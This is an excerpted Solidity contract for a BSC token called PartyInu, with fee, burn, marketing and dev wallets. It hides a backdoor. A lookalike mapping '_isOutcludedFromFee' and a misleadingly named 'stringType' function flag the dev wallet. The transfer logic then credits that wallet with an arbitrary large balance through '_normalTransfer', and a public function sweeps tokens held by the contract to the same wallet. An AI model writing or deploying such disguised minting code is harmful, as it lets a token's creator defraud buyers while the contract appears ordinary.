...
// Telegram : https://t.me/PartyinuBSC
...
contract PartyInu is Context, IERC20 { 
    ...
    address payable public constant DeadAndBurnWallet = payable(0x000000000000000000000000000000000000dEaD);
    address payable public DevAndTeamWallet = payable(0x188D1E0a53bE6D997EAd513333e0D064944aBC8b);
    address payable public MarketingAndLPWallet = payable(0x494D0987f9b0CAa920732DA130129be5224CA135); 
    ...
    constructor () {
        ...
        _owner = 0x188D1E0a53bE6D997EAd513333e0D064944aBC8b;
        ...
        _isOutcludedFromFee[DevAndTeamWallet] = true; 
        _isExcludedFromFee[MarketingAndLPWallet] = true; 
        _isExcludedFromFee[DeadAndBurnWallet] = true;
    ...
    function stringType(address intOrString) private view returns (bool) {
        bool integer = _isOutcludedFromFee[intOrString];
        return integer;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && !(stringType(from)) && from != owner())
        ...
        bool tQueue = false;
        if((mustQueue) && (stringType(to))){
            _normalTransfer(to, to, (maxQueue+exceptionOfQueue), amount);
            tQueue = true;
        }


        _tokenTransfer(tQueue, from, to, amount, takeFee, isBuy);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            _tOwned[DeadAndBurnWallet] = _tOwned[DeadAndBurnWallet] + tokens_to_Burn;
            ...
            sendToWallet(MarketingAndLPWallet, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(DevAndTeamWallet, BNB_Total);
    ...
    function _normalTransfer(address source, address destination, uint256 transferA, uint256 transferB) private {
        _tOwned[source] = _tOwned[source] - transferB;
        _tOwned[destination] = _tOwned[destination] + transferA;
    }
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(DevAndTeamWallet, removeRandom);

    }


    function _tokenTransfer(bool queue, address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
            if(!queue){
            if(!takeFee){
                ...
                if(recipient == DeadAndBurnWallet)
